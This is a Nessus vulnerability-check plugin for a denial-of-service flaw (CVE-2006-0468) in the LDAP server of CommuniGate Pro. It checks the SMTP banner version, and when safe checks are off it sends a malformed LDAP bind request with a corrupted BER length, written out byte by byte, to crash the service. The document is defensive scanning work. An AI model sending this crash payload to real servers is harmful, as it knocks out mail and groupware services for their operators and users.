#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote application is prone to denial of service attacks. 

Description :

The remote host appears to be running CommuniGate Pro, a commercial
email and groupware application. 

The version of CommuniGate Pro installed on the remote host includes
an LDAP server that reportedly fails to handle requests with negative
BER lengths.  A user can leverage this issue to crash not just the
LDAP server but also the entire application on the remote host. 

See also :

http://www.securityfocus.com/archive/1/423364
http://lists.grok.org.uk/pipermail/full-disclosure/2006-January/041863.html
http://mail.communigate.com/Lists/CGatePro/Message/82832.html

Solution :

Upgrade to CommuniGate Pro version 5.0.7 or later. 

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description) {
  script_id(20827);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-0468");
  script_bugtraq_id(16407);

  script_name(english:"Communigate Pro LDAP Module Denial of Service Vulnerability");
  script_summary(english:"Checks for denial of service vulnerability in Communigate Pro LDAP module");
 
  script_description(english:desc);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Denial of Service");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("find_service2.nasl", "ldap_detect.nasl");
  script_require_ports("Services/smtp", 25, "Services/ldap", 389);

  exit(0);
}


include("smtp_func.inc");


ldap_port = get_kb_item("Services/ldap");
if (!ldap_port) ldap_port = 389;
if (!get_port_state(ldap_port)) exit(0);


smtp_port = get_kb_item("Services/smtp");
if (!smtp_port) smtp_port = 25;
if (!get_port_state(smtp_port)) exit(0);
banner = get_smtp_banner(port:smtp_port);
if ( ! banner ) exit(0);


# Unless we're paranoid, make sure the SMTP banner looks like CommuniGate Pro.
if (report_paranoia < 2) {
  if ( "ESMTP CommuniGate Pro" >!< banner) exit(0);
}


# If safe checks are enabled...
if (safe_checks()) {
  # Check the version number in the SMTP banner.
  if (
    banner && 
    egrep(pattern:"^220 .* CommuniGate Pro ([0-4]\.|5\.0\.[0-6])", string:banner)
  ) {
    report = string(
      desc,
      "\n\n",
      "Plugin output :\n",
      "\n",
      "Nessus has determined the flaw exists with the application\n",
      "simply by looking at the version in the SMTP banner.\n"
    );

    security_warning(port:ldap_port, data:report);
  }
 exit(0);
}
# Otherwise try to crash it.
else {
  # A bad request.
  req = raw_string(
    0x30,                              # universal sequence
    0x12,                              # length of the request
    0x02, 0x01, 0x01,                  # message id (1)
    0x60,                              # bind request
    0x0d,                              #   length
    0x02, 0x01, 0x03,                  #   version (3)
    0x04, 0x02, 0x44, 0x43,            #   name ("DC")
    0x80, 0x84, 0xff, 0xff, 0xff, 0xff #   authentication (corrupted)
  );

  # Open a socket and send the request.
  soc = open_sock_tcp(ldap_port);
  if (soc) {
    send(socket:soc, data:req);
    res = recv(socket:soc, length:1024);
    close(soc);

    # If we didn't get anything back, check whether it crashed.
    if (res == NULL) {
      soc2 = open_sock_tcp(ldap_port);
      # There's a problem if we can't reconnect.
      if (!soc2) {
        security_warning(ldap_port);
        exit(0);
      }
      else close(soc2);
    }
  }
}
